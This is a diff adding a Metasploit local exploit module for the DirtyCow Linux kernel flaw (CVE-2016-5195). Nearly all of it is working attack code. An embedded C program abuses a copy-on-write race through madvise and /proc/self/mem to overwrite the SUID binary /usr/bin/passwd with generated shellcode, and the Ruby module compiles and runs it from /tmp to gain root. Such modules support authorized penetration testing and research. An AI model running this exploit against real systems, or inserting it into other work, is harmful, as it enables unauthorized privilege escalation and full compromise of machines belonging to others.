@@ -1,0 +1,194 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = ManualRanking
+
+  include Msf::Exploit::EXE
+  include Msf::Post::File
+  include Msf::Exploit::FileDropper
+
+  def initialize(info={})
+    super(update_info(info, {
+      'Name' => 'Linux Kernel DirtyCow Local Privilege Escalation',
+      'Description' => %q{
+        A race condition was found in the way the Linux kernel's memory
+        subsystem handled the copy-on-write (COW) breakage of private
+        read-only memory mappings. An unprivileged local user could use
+        this flaw to gain write access to otherwise read-only memory mappings
+        and thus increase their privileges on the system.
+        The bug has existed since around Linux Kernel 2.6.22 (released in 2007).
+      },
+      'License' => MSF_LICENSE,
+      'Author' => [
+        'Phil Oester', # Vulnerability Discovery
+        'Robin Verton', # cowroot.c developer
+        'Nixawk' # original module developer
+      ],
+      'Platform' => [ 'linux' ],
+      'Arch' => [ ARCH_X86, ARCH_X64 ],
+      'SessionTypes' => ['shell', 'meterpreter'],
+      'References' =>
+        [
+          ['CVE', '2016-5195'],
+          ['URL', 'https://dirtycow.ninja/'],
+          ['URL', 'https://github.com/dirtycow/dirtycow.github.io/issues/25'],
+          ['URL', 'https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails'],
+          ['URL', 'https://access.redhat.com/security/cve/cve-2016-5195'],
+          ['URL', 'https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619']
+        ],
+      'Targets' =>
+        [
+          [ 'Linux x86', { 'Arch' => ARCH_X86 }],
+          [ 'Linux x64', { 'Arch' => ARCH_X86_64 }]
+        ],
+      'DefaultOptions' =>
+        {
+          'PrependSetresuid' => true,
+          'PrependSetuid'    => true
+        },
+      'DefaultTarget' => 0,
+      'DisclosureDate' => 'Oct 19 2016'
+    }))
+
+    register_options([
+      OptString.new("WritableDir", [ true, "A directory where we can write files (must not be mounted noexec)", "/tmp" ])
+    ])
+  end
+
+  def check
+    kernel = Gem::Version.new(cmd_exec('/bin/uname -r'))
+    if kernel >= Gem::Version.new('2.6.22')
+      CheckCode::Appears
+    else
+      CheckCode::Safe
+    end
+  end
+
+  def on_new_session(client)
+    client.shell_command_token('echo 0 > /proc/sys/vm/dirty_writeback_centisecs')
+  end
+
+  def exploit
+    if check != CheckCode::Appears
+      fail_with(Failure::NotVulnerable, 'Target not vulnerable! punt!')
+    end
+
+    main = %q^
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <pthread.h>
+#include <string.h>
+#include <unistd.h>
+
+void *map;
+int f;
+int stop = 0;
+struct stat st;
+char *name;
+pthread_t pth1, pth2, pth3;
+
+char suid_binary[] = "/usr/bin/passwd";
+
+SHELLCODE
+
+unsigned int shellcode_size = 0;
+
+
+void *madviseThread(void *arg)
+{
+  char *str;
+  str=(char*)arg;
+  int i, c=0;
+  for(i=0; i<1000000 && !stop; i++) {
+    c += madvise(map,100,MADV_DONTNEED);
+  }
+  printf("thread stopped\n");
+}
+
+void *procselfmemThread(void *arg)
+{
+  char *str;
+  str = (char*)arg;
+  int f=open("/proc/self/mem",O_RDWR);
+  int i, c=0;
+  for(i=0; i<1000000 && !stop; i++) {
+    lseek(f, map, SEEK_SET);
+    c += write(f, str, shellcode_size);
+  }
+  printf("thread stopped\n");
+}
+
+void *waitForWrite(void *arg) {
+  char buf[shellcode_size];
+
+  for(;;) {
+    FILE *fp = fopen(suid_binary, "rb");
+
+    fread(buf, shellcode_size, 1, fp);
+
+    if(memcmp(buf, shellcode, shellcode_size) == 0) {
+      printf("%s overwritten\n", suid_binary);
+      break;
+    }
+
+    fclose(fp);
+    sleep(1);
+  }
+
+  stop = 1;
+  system(suid_binary);
+}
+
+int main(int argc, char *argv[]) {
+  char *backup;
+
+  asprintf(&backup, "cp %s /tmp/bak", suid_binary);
+  system(backup);
+
+  f = open(suid_binary,O_RDONLY);
+  fstat(f,&st);
+
+  char payload[st.st_size];
+  memset(payload, 0x90, st.st_size);
+  memcpy(payload, shellcode, shellcode_size+1);
+
+  map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
+
+  pthread_create(&pth1, NULL, &madviseThread, suid_binary);
+  pthread_create(&pth2, NULL, &procselfmemThread, payload);
+  pthread_create(&pth3, NULL, &waitForWrite, NULL);
+
+  pthread_join(pth3, NULL);
+
+  return 0;
+}
+^
+    payload_file = generate_payload_exe
+    main.gsub!(/SHELLCODE/) do
+      # Split the payload into chunks and dump it out as a hex-escaped
+      # literal C string.
+      Rex::Text.to_c(payload_file, 64, "shellcode")
+    end
+    main.gsub!(/shellcode_size = 0/, "shellcode_size = #{payload_file.length}")
+
+    evil_path = "#{datastore['WritableDir']}/#{Rex::Text.rand_text_alpha(10)}"
+
+    write_file("#{evil_path}.c", main)
+    print_status("Compiling #{evil_path}.c via gcc")
+
+    output = cmd_exec("/usr/bin/gcc -pthread -o #{evil_path}.out #{evil_path}.c")
+    output.each_line { |line| vprint_status(line.chomp) }
+
+    print_status("Executing at #{Time.now}.")
+    output = cmd_exec("chmod +x #{evil_path}.out; #{evil_path}.out")
+    output.each_line { |line| vprint_status(line.chomp) }
+
+    register_file_for_cleanup("#{evil_path}.c")
+    register_file_for_cleanup("#{evil_path}.out")
+  end
+end
